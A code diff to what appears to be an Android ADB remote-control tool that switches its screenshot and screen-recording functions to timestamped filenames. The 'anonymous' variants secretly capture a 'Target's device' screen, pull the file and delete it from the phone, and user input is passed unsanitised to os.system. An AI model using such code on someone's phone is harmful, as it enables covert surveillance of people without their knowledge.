@@ -4,6 +4,7 @@ import socket
 import time
 import subprocess
 import platform
+import datetime
 from modules import banner
 
 
@@ -125,7 +126,10 @@ def get_shell():
 
 
 def get_screenshot():
-    os.system("adb shell screencap -p /sdcard/screen.png")
+
+    # Getting a temporary file name to store time specific results
+    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
+    os.system(f"adb shell screencap -p /sdcard/{file_name}")
     print("\nEnter location to save screenshot, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
@@ -136,28 +140,31 @@ def get_screenshot():
         print(
             f"\nSaving screenshot to {destination}\n")
 
-    os.system(f"adb pull /sdcard/screen.png {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {destination}")
 
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"{opener} {destination}/screen.png")
+        os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"{opener} {destination}/screen.png")
+                os.system(f"{opener} {destination}/{file_name}")
 
     print("\n")
 
 
 def screenrecord():
+    # Getting a temporary file name to store time specific results
+    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'
+
     time = input("\nEnter the recording duration (in seconds) > ")
     print('\nStarting Screen Recording...\n')
     os.system(
-        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
+        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/{file_name}")
     print("\nEnter location to save video, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
@@ -168,19 +175,19 @@ def screenrecord():
         print(
             f"\nSaving video to {destination}\n")
 
-    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {destination}")
 
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"{opener} {destination}/demo.mp4")
+        os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"{opener} {destination}/demo.mp4")
+                os.system(f"{opener} {destination}/{file_name}")
     print("\n")
 
 
@@ -404,7 +411,9 @@ def copy_camera():
 
 
 def anonymous_screenshot():
-    os.system("adb shell screencap -p /sdcard/screen.png")
+    # Getting a temporary file name to store time specific results
+    file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
+    os.system(f"adb shell screencap -p /sdcard/{file_name}")
     print("\nEnter location to save screenshot, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
@@ -415,30 +424,34 @@ def anonymous_screenshot():
         print(
             f"\nSaving screenshot to {destination}\n")
 
-    os.system(f"adb pull /sdcard/screen.png {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {destination}")
 
     print('\nDeleting screenshot from Target\'s device\n')
-    os.system(f"adb shell rm -v /sdcard/screen.png")
+    os.system(f"adb shell rm /sdcard/{file_name}")
+
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"{opener} {destination}/screen.png")
+        os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"{opener} {destination}/screen.png")
+                os.system(f"{opener} {destination}/{file_name}")
 
     print("\n")
 
 
 def anonymous_screenrecord():
+    # Getting a temporary file name to store time specific results
+    file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'
+
     time = input("\nEnter the recording duration (in seconds) > ")
     print('\nStarting Screen Recording...\n')
     os.system(
-        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/demo.mp4")
+        f"adb shell screenrecord --verbose --time-limit {time} /sdcard/{file_name}")
     print("\nEnter location to save video, Press 'Enter' for default")
     destination = input("> ")
     if destination == "":
@@ -449,21 +462,21 @@ def anonymous_screenrecord():
         print(
             f"\nSaving video to {destination}\n")
 
-    os.system(f"adb pull /sdcard/demo.mp4 {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {destination}")
 
-    print('\nDeleting recording from Target\'s device\n')
-    os.system(f"adb shell rm -v /sdcard/demo.mp4")
+    print('\nDeleting video from Target\'s device\n')
+    os.system(f"adb shell rm /sdcard/{file_name}")
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"{opener} {destination}/demo.mp4")
+        os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"{opener} {destination}/demo.mp4")
+                os.system(f"{opener} {destination}/{file_name}")
     print("\n")
 
 
